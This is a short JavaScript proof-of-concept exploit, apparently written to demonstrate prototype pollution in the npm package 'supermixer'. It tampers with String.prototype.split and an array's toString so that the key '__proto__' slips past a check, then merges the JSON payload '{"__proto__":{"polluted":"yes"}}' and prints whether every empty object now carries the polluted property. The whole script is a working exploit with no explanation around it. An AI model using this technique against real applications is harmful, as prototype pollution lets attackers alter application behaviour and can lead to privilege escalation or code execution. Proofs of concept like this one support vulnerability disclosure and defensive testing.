var arg = ['__proto__'];
var flag1 = true;
arg.toString = function () {
    if (flag1) {
        flag1 = false;
        return 'foo';
    } else {
        return '__proto__';
    }
};
String.prototype.split = function () {
    return [
        arg,
        'polluted'
    ];
};
var mixer = require('supermixer');
obj = {};
console.log({}.polluted);
var payload = '{"__proto__":{"polluted":"yes"}}';
mixer.merge({}, JSON.parse(payload));
console.log({}.polluted);